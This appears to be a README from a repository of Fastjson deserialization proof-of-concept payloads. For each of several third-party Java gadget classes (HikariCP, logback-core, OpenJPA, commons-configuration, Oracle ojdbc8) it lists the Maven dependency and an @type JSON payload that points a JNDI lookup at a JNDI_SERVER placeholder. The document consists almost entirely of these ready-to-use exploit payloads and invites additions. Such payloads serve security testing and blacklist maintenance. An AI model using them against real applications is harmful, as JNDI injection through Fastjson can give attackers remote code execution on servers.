# FastjsonPocs

一些结合第三方组件的Fastjson POC，在1.2.48以后版本中陆续被添加至黑名单，欢迎补充。

### com.zaxxer.hikari.HikariConfig:

```
  <dependency>
      <groupId>com.zaxxer</groupId>
      <artifactId>HikariCP</artifactId>
      <version>3.3.1</version>
  </dependency>

```

>   {"@type":"com.zaxxer.hikari.HikariConfig","metricRegistry":"JNDI_SERVER"}

### ch.qos.logback.core.db.JNDIConnectionSource:

```
  <dependency>
      <groupId>ch.qos.logback</groupId>
      <artifactId>logback-core</artifactId>
      <version>1.2.2</version>
  </dependency>

```

>   {"@type":"ch.qos.logback.core.db.JNDIConnectionSource","jndiLocation":"JNDI_SERVER"}

### org.apache.openjpa.ee.

```
  <dependency>
      <groupId>org.apache.openjpa</groupId>
      <artifactId>openjpa</artifactId>
      <version>3.0.0</version>
  </dependency>

```

>   {"@type":"org.apache.openjpa.ee.JNDIManagedRuntime","transactionManagerName":"JNDI_SERVER","rollbackOnly":null}
>   {"@type":"org.apache.openjpa.ee.RegistryManagedRuntime","registryName":"JNDI_SERVER","rollbackOnly":null}

### org.apache.commons.configuration.JNDIConfiguration

```
  <dependency>
      <groupId>commons-configuration</groupId>
      <artifactId>commons-configuration</artifactId>
      <version>1.10</version>
  </dependency>

```

>   {"@type":"org.apache.commons.configuration.JNDIConfiguration","prefix":"JNDI_SERVER"}

### org.apache.commons.configuration2.JNDIConfiguration

```
  <dependency>
      <groupId>org.apache.commons</groupId>
      <artifactId>commons-configuration2</artifactId>
      <version>2.2</version>
  </dependency>

```

>   {"@type":"org.apache.commons.configuration2.JNDIConfiguration","prefix":"JNDI_SERVER"}

### oracle.jdbc.rowset.OracleJDBCRowSet

```
  <dependency>
      <groupId>com.oracle.ojdbc</groupId>
      <artifactId>ojdbc8</artifactId>
      <version>19.3.0.0</version>
  </dependency>

```

>   {"@type":"oracle.jdbc.rowset.OracleJDBCRowSet","dataSourceName":"JNDI_SERVER","command":"test"}
